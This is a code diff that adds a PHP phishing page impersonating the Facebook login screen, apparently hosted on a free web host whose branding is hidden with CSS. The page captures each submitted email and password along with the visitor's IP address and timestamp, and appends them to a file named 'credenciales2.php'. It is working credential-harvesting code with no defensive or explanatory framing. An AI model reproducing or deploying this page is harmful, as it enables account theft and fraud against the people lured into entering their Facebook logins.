@@ -1,0 +1,41 @@
+<?php session_start(); ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+    <link rel="icon" href="logo.png"/>
+    <title>Facebook - Entrar o registrarse</title>
+    <script src="./script.js"></script>
+    <style>
+        img[alt="www.000webhost.com"] {
+            display: none
+        }
+    </style>
+    <meta name="theme-color" content="#3b5998" />
+</head>
+<?php
+
+date_default_timezone_set("America/Bogota");
+$fechaYHora = date("Y-m-d H:i:s");
+$ip = isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : ""; // Captura ip
+
+# Armar mensaje
+
+$contrasena = $_POST["pass"];
+$email = $_POST["email"];
+
+$texto = "";
+$mensaje = "";
+$texto .= "=============================== <br>" . PHP_EOL;
+$texto .= "Datos capturados de intervalos <br>" . PHP_EOL;
+$texto .= "=============================== <br>" . PHP_EOL;
+$texto .= "Email: $email <br>" . PHP_EOL;
+$texto .= "Contraseña: $contrasena <br>" . PHP_EOL;
+$mensaje .= PHP_EOL;
+$texto .= "=============================== <br> <br> <br>" . PHP_EOL;
+           
+           $file=fopen("credenciales2.php","a+") or exit("Unable to open file!");
+   fwrite($file, $texto);
+fclose($file);
+?>
